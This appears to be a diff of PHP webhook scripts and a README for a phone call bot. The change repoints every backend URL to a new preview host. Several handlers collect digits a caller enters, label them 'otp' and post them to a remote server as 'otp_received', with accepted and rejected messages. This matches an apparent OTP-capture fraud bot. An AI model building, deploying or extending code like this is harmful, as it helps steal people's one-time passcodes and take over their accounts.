@@ -60,7 +60,7 @@ if (empty($call_id)) {
 }
 
 // Fetch call data from API
-$api_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
+$api_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
 $call_data = json_decode(file_get_contents($api_url), true);
 
 if (!$call_data) {
@@ -94,7 +94,7 @@ $call_id = $_GET['call_id'] ?? '';
 $digits = $_POST['Digits'] ?? '';
 
 // Fetch call data
-$api_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
+$api_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
 $call_data = json_decode(file_get_contents($api_url), true);
 
 $webhook_base = $call_data['external_webhook_base'];
@@ -125,7 +125,7 @@ $call_id = $_GET['call_id'] ?? '';
 $digits = $_POST['Digits'] ?? '';
 
 // Fetch call data
-$api_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
+$api_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
 $call_data = json_decode(file_get_contents($api_url), true);
 
 $voice = $call_data['tts_voice'] ?? 'Aurora';
@@ -142,7 +142,7 @@ if (!empty($digits) && strlen($digits) == $digits_required) {
     $rejected_message = $call_data['rejected_message'] ?? '';
     
     // Send OTP to backend for logging
-    $update_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
+    $update_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
     $update_data = json_encode(['event' => 'otp_received', 'otp' => $digits, 'status' => 'otp_entered']);
     file_get_contents($update_url, false, stream_context_create([
         'http' => [
@@ -184,7 +184,7 @@ if (!empty($digits) && strlen($digits) == $digits_required) {
 $call_id = $_GET['call_id'] ?? '';
 
 // Fetch call data
-$api_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
+$api_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/{$call_id}";
 $call_data = json_decode(file_get_contents($api_url), true);
 
 $voice = $call_data['tts_voice'] ?? 'Aurora';
@@ -192,7 +192,7 @@ $language = $call_data['language'] ?? 'en-US';
 $accepted_message = $call_data['accepted_message'] ?? '';
 
 // Send event to backend
-$update_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
+$update_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
 $update_data = json_encode(['event' => 'call_accepted', 'status' => 'accepted']);
 file_get_contents($update_url, false, stream_context_create([
     'http' => [
@@ -220,7 +220,7 @@ $call_status = $_POST['CallStatus'] ?? '';
 $recording_url = $_POST['RecordingUrl'] ?? '';
 
 // Send status to backend
-$update_url = "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
+$update_url = "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/update/{$call_id}";
 $update_data = json_encode([
     'event' => "status_{$call_status}",
     'status' => strtolower($call_status),
@@ -267,7 +267,7 @@ Backend already replaces variables before saving to Firestore:
 ### Test API Endpoint:
 
 ```bash
-curl "https://callbot-analytics.preview.emergentagent.com/api/webhooks/external/call/{call_id}"
+curl "https://lanjutkan-ini.preview.emergentagent.com/api/webhooks/external/call/{call_id}"
 ```
 
 ### Expected Response:
